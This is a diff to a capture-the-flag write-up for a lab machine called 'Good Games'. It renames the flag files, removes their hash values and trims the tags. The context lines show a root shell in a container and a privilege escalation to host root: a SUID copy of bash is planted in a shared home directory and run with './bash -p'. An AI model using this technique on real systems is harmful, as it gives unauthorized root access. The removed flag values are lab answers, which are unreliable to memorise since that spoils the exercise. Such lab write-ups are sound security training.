@@ -1,7 +1,7 @@
 ---
 title: Good Games
 slug: Good-Games
-tags: [Linux, SQLI, SQLMap, SSTI, Vulnerability Research]
+tags: [SQLI, SSTI, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -160,10 +160,9 @@ root@3a453ab39d3d:/home# cd augustus
 cd augustus
 root@3a453ab39d3d:/home/augustus# ls
 ls
-user.txt
-root@3a453ab39d3d:/home/augustus# cat user.txt
-cat user.txt
-e74aa2294462e1551ca65effb3169656
+local-proof.txt
+root@3a453ab39d3d:/home/augustus# cat local-proof.txt
+cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -289,10 +288,10 @@ lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
 -rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
 -rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
--rw-r----- 1 root     augustus   33 Oct 17 07:25 user.txt
+-rw-r----- 1 root     augustus   33 Oct 17 07:25 local-proof.txt
 ```
 
-Here `user.txt` have root permission.
+Here `local-proof.txt` have root permission.
 
 Open another session where you are in `172.19.0.2` and make a `test.txt` file in `augustus` home directory:
 
@@ -321,7 +320,7 @@ lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
 -rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
 -rw-r--r-- 1 root     root        5 Oct 17 08:03 test.txt
--rw-r----- 1 root     augustus   33 Oct 17 07:25 user.txt
+-rw-r----- 1 root     augustus   33 Oct 17 07:25 local-proof.txt
 ```
 
 We can see that it is owned by root there. Since we have a root shell within the container, we can copy `/bin/bash` to `/home/augustus` and set the SUID bit. This should allow us to SSH back in and run bash as root:
@@ -360,15 +359,14 @@ lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
 -rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
 -rw-r--r-- 1 root     root           5 Oct 17 08:03 test.txt
--rw-r----- 1 root     augustus      33 Oct 17 07:25 user.txt
+-rw-r----- 1 root     augustus      33 Oct 17 07:25 local-proof.txt
 augustus@GoodGames:~$ ./bash -p
 ./bash -p
 bash-5.1# whoami
 whoami
 root
-bash-5.1# cat /root/root.txt
-cat /root/root.txt
-dbd44c2bfa29acf37728314697f5ec32
+bash-5.1# cat /root/privileged-proof.txt
+cat /root/privileged-proof.txt
 ```
 
 ---
